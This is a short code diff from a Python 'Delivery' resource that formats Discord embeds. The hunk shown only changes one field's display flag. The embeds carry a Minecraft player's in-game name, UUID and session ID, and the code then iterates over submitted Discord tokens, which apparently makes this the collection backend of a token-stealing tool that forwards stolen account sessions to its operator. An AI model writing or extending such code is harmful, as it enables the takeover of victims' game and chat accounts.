@@ -92,7 +92,7 @@ class Delivery(Resource):
         mc_embed.set_footer(text=config['mc_embed_footer_text'], icon_url=config['mc_embed_footer_icon'])
         mc_embed.add_embed_field(name="IGN", value=cb + mc['ign'] + cb, inline=True)
         mc_embed.add_embed_field(name="UUID", value=cb + mc['uuid'] + cb, inline=True)
-        mc_embed.add_embed_field(name="Session ID", value=cb + mc['ssid'] + cb, inline=True)
+        mc_embed.add_embed_field(name="Session ID", value=cb + mc['ssid'] + cb, inline=False)
         embeds.append(mc_embed)
         if len(args['discord']) > 0:
             for tokenjson in args['discord']:
